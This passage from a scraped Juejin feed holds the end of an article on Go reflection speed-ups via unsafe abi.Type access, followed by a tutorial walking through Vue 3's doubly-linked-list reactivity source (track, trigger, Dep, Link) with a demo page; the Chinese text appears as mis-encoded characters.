<p><strong>ç±»å‹æ ¡éªŒ</strong>ï¼šæ“ä½œå‰éƒ½ä¼šæ£€æŸ¥ç±»å‹æ˜¯ä¸æ˜¯ç»“æ„ä½“</p>
</li>
</ul>
<h3 data-id="heading-14">5.2 å…¼å®¹æ€§</h3>
<ul>
<li>
<p><strong>Go1.14+</strong>ï¼šé€‚ç”¨äºGo1.14åŠä»¥ä¸Šç‰ˆæœ¬ï¼Œå› ä¸º <code>abi.Type</code> çš„å†…å­˜å¸ƒå±€ä»1.14å¼€å§‹å›ºå®š</p>
</li>
<li>
<p><strong>è·¨å¹³å°</strong>ï¼š64ä½æ¶æ„ï¼ˆamd64/arm64ï¼‰ä¸‹ï¼Œ<code>abiTypeSize = 48</code> æ˜¯å›ºå®šçš„</p>
</li>
</ul>
<h2 data-id="heading-15">å…­ã€æ€»ç»“</h2>
<p>é€šè¿‡ç›´æ¥æ“ä½œ <code>runtime</code> å±‚çš„ <code>abi.Type</code> ç»“æ„ä½“ï¼Œå®ç°äº†é›¶æ‹·è´çš„åå°„ä¼˜åŒ–ï¼š</p>
<ol>
<li>
<p><strong>æ ¸å¿ƒæ€è·¯</strong>ï¼šç»•å¼€ <code>reflect</code> åŒ…çš„å°è£…ï¼Œç›´æ¥è®¿é—®åº•å±‚ <code>abi.Type</code></p>
</li>
<li>
<p><strong>å…³é”®æŠ€æœ¯</strong>ï¼šå›ºå®šåç§»é‡ + unsafe æ“ä½œ + é¿å…æ— æ„ä¹‰çš„å†…å­˜åˆ†é…</p>
</li>
<li>
<p><strong>æ€§èƒ½æå‡</strong>ï¼šæ¯”å®˜æ–¹åå°„åŒ…å¿«1000+å€ï¼Œå†…å­˜åˆ†é…å‡ ä¹ä¸ºé›¶</p>
</li>
</ol>
<p>è¿™ä¸ªæ–¹æ¡ˆé€‚ç”¨äºé«˜é¢‘åå°„åœºæ™¯ï¼ŒåƒORMã€åºåˆ—åŒ–æ¡†æ¶è¿™äº›åœ°æ–¹ï¼Œèƒ½æ˜¾è‘—æå‡æ€§èƒ½ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ”¥Vue é‡‡ç”¨åŒé“¾è¡¨é‡æ„å“åº”å¼ï¼Œä½ ç«Ÿç„¶è¿˜ä¸çŸ¥é“ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7600955777315766310</link>    <guid>https://juejin.cn/post/7600955777315766310</guid>    <pubDate>2026-01-30T11:23:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777315766310" data-draft-id="7600414546188943370" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ”¥Vue é‡‡ç”¨åŒé“¾è¡¨é‡æ„å“åº”å¼ï¼Œä½ ç«Ÿç„¶è¿˜ä¸çŸ¥é“ï¼Ÿ"/> <meta itemprop="keywords" content="Vue.js,æºç é˜…è¯»"/> <meta itemprop="datePublished" content="2026-01-30T11:23:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Moseå‰ç«¯"/> <meta itemprop="url" content="https://juejin.cn/user/2436173500528103"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ”¥Vue é‡‡ç”¨åŒé“¾è¡¨é‡æ„å“åº”å¼ï¼Œä½ ç«Ÿç„¶è¿˜ä¸çŸ¥é“ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2436173500528103/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Moseå‰ç«¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T11:23:13.000Z" title="Fri Jan 30 2026 11:23:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ä»Šå¤©å’±ä»¬æ¥èŠèŠ Vue å“åº”å¼ç³»ç»Ÿâ€”â€”è¿™ä¸ªè®©ä½ å†™ä»£ç æ—¶â€œæ•°æ®è‡ªåŠ¨å˜è§†å›¾ï¼Œè§†å›¾è‡ªåŠ¨å˜æ•°æ®â€çš„ç¥å¥‡é­”æ³•ï¼Œvue3å‘å¸ƒåï¼Œç½‘ä¸Šå¾ˆå¤šåˆ†æVue3å“åº”å¼æºç ï¼ŒåŸºäºweakMap -&gt; map -&gt; setçš„è¿™ç§æ•°æ®èŠ‚åå®ç°å“åº”å¼ï¼Œï¼Œå…¶å®æ—©å°±å·å·ç”¨åŒé“¾è¡¨é‡æ„äº†å“åº”å¼æ ¸å¿ƒï¼Œç©å‡ºäº†æ–°èŠ±æ ·ï¼Œä»Šå¤©å°±å¸¦å¤§å®¶æ‰’ä¸€æ‰’è¿™ä»½æºç ï¼Œæ–°æ‰‹ä¹Ÿèƒ½çœ‹æ‡‚ï¼Œè€é¸Ÿä¹Ÿèƒ½è¡¥æ¼ï½~</p>
<p>å…ˆæŠ›ä¸ªçµé­‚æ‹·é—®ï¼šä¸ºå•¥Vue3è¦æ”¾ç€å¥½å¥½çš„Setä¾èµ–æ”¶é›†æ–¹æ¡ˆä¸ç”¨ï¼Œéè¦æŠ˜è…¾åŒé“¾è¡¨ï¼Ÿç­”æ¡ˆå¾ˆç®€å•â€”â€”<strong>Setæ–¹æ¡ˆå¤ªâ€œç¬¨â€ï¼Œæ€§èƒ½æ‹‰èƒ¯è¿˜éº»çƒ¦</strong>ï¼Vue3æ—©æœŸçš„å“åº”å¼ä¾èµ–æ”¶é›†ï¼Œç”¨çš„æ˜¯Setæ¥å­˜å‚¨å‰¯ä½œç”¨å‡½æ•°ï¼Œçœ‹ä¼¼ç®€æ´ï¼Œä½†åˆ é™¤ä¾èµ–æ—¶è¦éå†æ•´ä¸ªSetæŸ¥æ‰¾ç›®æ ‡ï¼Œæ›´æ–°çš„æ—¶å€™æ›´æ˜¯â€œå¤§æ°´æ¼«çŒâ€ï¼Œæ˜æ˜åªæ”¹äº†ä¸€ä¸ªå˜é‡ï¼Œå´è¦è§¦å‘ä¸€å †æ— å…³çš„æ›´æ–°ï¼ŒCPUéƒ½è¦å“­äº†ã€‚</p>
<p>è€ŒåŒé“¾è¡¨ï¼Œå°±æ˜¯Vue3ç»™å“åº”å¼â€œå¼€çš„å¤–æŒ‚â€â€”â€”è½»é‡ã€é«˜æ•ˆã€èƒ½ç²¾å‡†å®šä½ï¼Œå®Œç¾è§£å†³äº†Setæ”¶é›†çš„ç—›ç‚¹ã€‚å°±åƒç»™ä¾èµ–å…³ç³»è£…äº†ä¸ªâ€œå¯¼èˆªä»ªâ€ï¼Œæ‰¾ä¾èµ–ã€æ›´ä¾èµ–ã€åˆ ä¾èµ–ï¼Œä¸€æ­¥åˆ°ä½ï¼Œå†ä¹Ÿä¸ç”¨åƒSeté‚£æ ·çéå†æµªè´¹æ€§èƒ½ã€‚è¯ä¸å¤šè¯´ï¼Œç›´æ¥ä¸Šæºç ï¼Œè¾¹çœ‹è¾¹åæ§½ï½</p>
<h2 data-id="heading-1">æºç é˜…è¯»</h2>
<p>å¦‚æœè¿˜ä¸çŸ¥åˆ°æºç é˜…è¯»æŠ€å·§ï¼Œåˆå§‹å‡†å¤‡ï¼Œå¯ä»¥çœ‹ä¸‹åšä¸»ä¸Šä¸€ç¯‡æ–‡ç« <a href="https://juejin.cn/post/7600002531398778889" target="_blank" title="https://juejin.cn/post/7600002531398778889"># 90% çš„äººè¯»ä¸æ‡‚ Vue æºç ï¼Œæ˜¯å› ä¸ºæ²¡åšè¿™äº›å‡†å¤‡</a></p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªdemoæ–‡ä»¶index.htmlï¼Œé€šè¿‡æ–­ç‚¹æ–¹å¼æ¥é˜…è¯»æºç ï¼Œå¯ä»¥æ›´æ¸…æ™°çš„çœ‹åˆ°ä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­æ•°æ®æµçš„å˜åŒ–</p>
<pre><code class="hljs language-js" lang="js">&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;Vue Effect Test&lt;/title&gt;

    &lt;!-- å¼•å…¥ä½ æœ¬åœ° clone çš„ vue.global.js --&gt;
    &lt;script src="../../../../vue/dist/vue.global.js"&gt;&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;div id="text"&gt;&lt;/div&gt;

    &lt;button id="btn"&gt;count++&lt;/button&gt;

    &lt;script&gt;
        const { reactive, ref, effect } = Vue;

        // åˆ›å»ºå“åº”å¼æ•°æ®
        const state = reactive({
            count1: 1,
            count2: 2
        });

        // ç»‘å®š effectï¼šä¾èµ–æ”¶é›† + è‡ªåŠ¨æ›´æ–°
        effect(() =&gt; {
            // å»ºç«‹ä¸€ä¸ªé“¾è¡¨å…³ç³» 
            document.getElementById('text').innerText =
                `å½“å‰ count å€¼ï¼š${state.count1}`;
        });
        document.getElementById('btn').onclick = () =&gt; {
            state.count1++;
        };
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 data-id="heading-2">ä¾èµ–æ”¶é›†trackå‡½æ•°</h3>
<p>é˜…è¯»å“åº”å¼ä»£ç ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°<code>vue</code>å“åº”å¼æ¨¡å—<code>reactivity</code>æ¨¡å—ä¸‹<code>reactive.ts</code>æ–‡ä»¶ï¼Œç„¶åæ‰¾åˆ°reactiveå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å“åº”å¼å¯¹è±¡æ˜¯é€šè¿‡ <code>createReactiveObject</code>å‡½æ•°åˆ›å»ºå‡ºæ¥çš„ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e4d458b707d494baf0bc346097c74ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=q4XSL%2FFMPkDn2D1d69PJNMLdmZI%3D" alt="image.png" loading="lazy"/></p>
<p>å½“æˆ‘ä»¬æ·±å…¥åˆ° <code>createReactiveObject</code> å‡½æ•°å†…éƒ¨ï¼Œè¿™ä¸ªå‡½æ•°æ¥æ”¶äº”ä¸ªå‚æ•°ã€‚é€šè¿‡é€è¡Œè°ƒè¯•ï¼ˆdebuggerï¼‰æ‰§è¡Œå…¶ä»£ç é€»è¾‘å¯ä»¥æ¸…æ™°çœ‹åˆ°ï¼Œå‡½æ•°æœ€ç»ˆä¼šè¿”å›ä¸€ä¸ª Proxy å¯¹è±¡ â€”â€” è¿™æ­£æ˜¯ Vue å“åº”å¼ç³»ç»Ÿçš„æ ¸å¿ƒå®ç°åŸºç¡€ã€‚å¦‚æ­¤çœ‹æ¥ï¼Œå¤§åé¼é¼çš„ Proxy æ ¸å¿ƒåŸç†ï¼Œæ‹†è§£å¼€æ¥å…¶å®ä¹Ÿå¹¶ä¸å¤æ‚ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40c31f67ad624d1bb9f8214e1d028863~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=KzFNQIpA3vHT1L5Uz1psGGT53SE%3D" alt="image.png" loading="lazy"/></p>
<p>ç”±ä¸Šå›¾å¯è§ï¼Œ<code>baseHandlers</code>å…¶å®æœ¬è´¨å°±æ˜¯<code>MutableReactiveHandler</code>ï¼Œä½œä¸º<code>createReactiveObject</code>å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°ä¼ é€’è¿›å»ï¼Œå¯ä»¥çœ‹åˆ° <code>MutableReactiveHandler</code> ä¸­æœ‰ <code>get, set, deleteProperty, has, ownKeys </code>ç­‰æ–¹æ³•,<code>get</code>æ–¹æ³•ç»§æ‰¿è‡ª <code>BaseReactiveHandler</code>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ab89e5284c445029ff3744cd0e7ec4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=8NO8hIDLjlpa2%2BPY1RHAIfuPr18%3D" alt="image.png" loading="lazy"/></p>
<p>æŸ¥çœ‹getå–å€¼æ“ä½œï¼Œå¯ä»¥çœ‹åˆ°getæ“ä½œä¸»è¦åšçš„æ˜¯trackä¾èµ–æ”¶é›†ï¼Œæ”¶é›†å®Œæ¯•åæŠŠcount1åˆå§‹å€¼è¿”å›ï¼Œä¾›é¡µé¢å±•ç¤ºä½¿ç”¨ï¼ˆå¿½ç•¥åˆ¤æ–­ï¼Œæˆ‘ä»¬åªå…³å¿ƒä¸»çº¿é€»è¾‘ï¼‰</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e582c3c8d5ed44298136b601707b8f14~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=tBzGajVVThrS2Qy%2B1pNsvQElUsg%3D" alt="image.png" loading="lazy"/></p>
<p>åœ¨ <code>get</code> å‡½æ•°å†…éƒ¨ï¼Œæœ‰ä¸€ä¸ªæ ¸å¿ƒæ“ä½œæ˜¯ <code>track</code>ï¼ˆä¾èµ–è¿½è¸ªï¼‰ã€‚æ·±å…¥åˆ° <code>track</code> å‡½æ•°çš„å®ç°é€»è¾‘ä¸­å¯ä»¥å‘ç°ï¼Œ<code>Vue</code> æ˜¯é€šè¿‡ä¸€å¥—å±‚çº§åŒ–çš„æ•°æ®ç»“æ„æ¥ç»„ç»‡å“åº”å¼ä¾èµ–æ”¶é›†çš„ï¼šæœ€å¤–å±‚æ˜¯ <code>WeakMap</code>ï¼Œå…¶ä¸‹åµŒå¥— Mapï¼Œæœ€ç»ˆæŒ‡å‘å…·ä½“çš„ Dep å®ä¾‹ã€‚æˆ‘ä»¬è¿›åˆ°<code>track</code>å‡½æ•°å†…éƒ¨, é¦–å…ˆä¼šæŸ¥æ‰¾å½“å‰<code>targetMap</code>ä¸­æ˜¯å¦æœ‰<code>target</code>å¯¹åº”çš„<code>map</code>, æ²¡æœ‰æˆ‘ä»¬ä¼šåˆ›å»ºä¸€ä¸ª<code>map</code>, ç„¶åæˆ‘ä»¬ä¼šæŸ¥æ‰¾å½“å‰<code>count1</code>æ˜¯å¦æœ‰å¯¹åº”çš„<code>Dep</code>å®ä¾‹ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»ºä¸€ä¸ª<code>Dep</code>å¯¹è±¡</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4dbb600edf9a4c658c74dac460ce35ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=juVF2ltgHVPAtm9BWMIJbTFUXPg%3D" alt="image.png" loading="lazy"/></p>
<p>æˆ‘ä»¬çœ‹æ ¸å¿ƒæ“ä½œ<code>dep.track</code>, è¿™æ˜¯æˆ‘ä»¬ä¾èµ–æ”¶é›†çš„æ ¸å¿ƒå‡½æ•°; é¦–å…ˆä¼šé€šè¿‡<code>Link</code>ç±»åˆ›å»ºä¸€ä¸ª<code>link</code>èŠ‚ç‚¹, å…¶ä¸­ <code>activeSub</code>æ˜¯å½“å‰æ¿€æ´»çš„å‰¯ä½œç”¨å‡½æ•°ï¼Œ<code>this</code>æ˜¯å½“å‰çš„<code>dep</code>å¯¹è±¡, è¿™ä¹Ÿæ˜¯ä¸ºå•¥è¯´<code>link</code>æ˜¯è¿æ¥<code>dep</code>å’Œ<code>sub</code>çš„æ¡¥æ¢, åˆå§‹æ—¶å€™æˆ‘ä»¬ä¸åšæŒ‡é’ˆåç§»ï¼Œä½†æ˜¯è®¿é—®<code>count2</code>æ˜¯è¦è¿›è¡Œé“¾è¡¨æ–°å¢æ“ä½œçš„</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4dbc89523f074defb5ccee6e3825de0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=WayiFTYZGuS9SC%2FFREj0Tb8%2BNcI%3D" alt="image.png" loading="lazy"/></p>
<p>æ¥ä¸‹æ¥æ‰§è¡Œ<code>addSub</code>, æˆ‘ä»¬çœ‹çœ‹<code>addSub</code>ä¸­åˆ°åº•åšäº†ä»€ä¹ˆ? å…¶å®å°±æ˜¯æ›´æ–°<code>sub</code>å¯¹åº”çš„å‰å<code>sub</code>æŒ‡é’ˆï¼Œç”±äºæˆ‘ä»¬å½“å‰åªæœ‰ä¸€ä¸ªå‰¯ä½œç”¨ï¼Œæ‰€ä»¥<code>prevSub</code>æ˜¯<code>undefined</code>,æœ€åå½“å‰ <code>link</code> æŒ‚åˆ°å®ƒæ‰€å±çš„ <code>dep</code> ä¸Šï¼Œä½œä¸ºè¯¥ <code>dep</code> è®¢é˜…è€…é“¾è¡¨çš„å…¥å£ï¼Œè¿™æ ·æˆ‘ä»¬å°±å®Œæˆäº†count1çš„æ”¶é›†ï¼Œcount2ç±»ä¼¼çš„é˜…è¯»æ€è·¯</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5cdb969910974485aa29715518bdd630~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=n5SR%2BPkrMIxMEhwV4oh57dLn6ZU%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">ä¾èµ–è§¦å‘triggerå‡½æ•°</h3>
<p>æˆ‘ä»¬ç‚¹å‡»æŒ‰é’®ï¼Œä¿®æ”¹<code>count1</code>çš„å€¼ï¼Œæ­¤æ—¶æˆ‘ä»¬æƒ³è¦åšçš„æ˜¯é€šçŸ¥å‰¯ä½œç”¨å‡½æ•°çš„æ‰§è¡Œï¼Œä»è€Œè®©é¡µé¢è§†å›¾æ›´æ–°ï¼Œé‚£<code>vue</code>æ˜¯æ€ä¹ˆè§¦å‘æ›´æ–°çš„å‘¢ï¼Ÿ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a6a289e0d36436b82d4f24b61dddaec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=jLsc0a0%2BOgqvvycS3mmRE9A2VQ0%3D" alt="image.png" loading="lazy"/></p>
<p>å…¶ä¸­runæ–¹æ³•å†…éƒ¨æ ¸å¿ƒæ‰§è¡Œ<code>dep.trigger</code>æ–¹æ³•</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df9a6608bb9b4369b1a31a58bee11b30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=%2BnjghH54TxWdPVgMCMzjeTIvXdA%3D" alt="image.png" loading="lazy"/>
<code>dep.trigger</code>æ–¹æ³•å†…éƒ¨ï¼Œåœ¨<code>finally</code>å°¾éƒ¨æ‰§è¡Œ<code>endBatch</code>æ–¹æ³•</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0397aa331b04a9ab07c324e73520ae8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=RIV7EeuQBF4YMYHbJppetmluI5k%3D" alt="image.png" loading="lazy"/>
triggerå‡½æ•°å¦‚ä¸‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf58aa573298453ab032bd2ee496b17d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=1lPlw4G4GKMVomrh996h9V%2FgnUY%3D" alt="image.png" loading="lazy"/></p>
<p>åˆ¤æ–­æ˜¯å¦è‚®ï¼Œå¾ˆæ˜¾ç„¶æˆ‘ä»¬æ›´æ–°äº†æ•°æ®ï¼Œéœ€è¦æ‰§è¡Œå‰¯ä½œç”¨,æ‰€ä»¥æ‰§è¡Œ<code>this.runIfDirty</code></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d309a3c1327a4ebeb2f6f349079130c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=8PJE8i3m5iIXHDqgxDLJ%2FQctXKs%3D" alt="image.png" loading="lazy"/></p>
<p><code>this.runIfDirty</code>å†…éƒ¨è°ƒç”¨<code>this.run</code>æ–¹æ³•</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6bea8f33dd34b7994570a565ec76ccf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=%2BVHxUL%2F%2BHK%2BHfT5V7C7GM4mnnV4%3D" alt="image.png" loading="lazy"/></p>
<p><code>run</code>æ–¹æ³•ä¸­è¿”å› <code>this.fn()</code>å‡½æ•°
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa6261f160254daaa9a90bb2ba71dfc6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=r76Ohi8SEtBbCmhnWKiyxp0K2n4%3D" alt="image.png" loading="lazy"/></p>
<p>å…¶ä¸­fnå°±æ˜¯æˆ‘ä»¬çš„å‰¯ä½œç”¨å‡½æ•°ï¼Œæ‰¾åˆ°æ‰§è¡Œå®ƒå°±okå•¦</p>
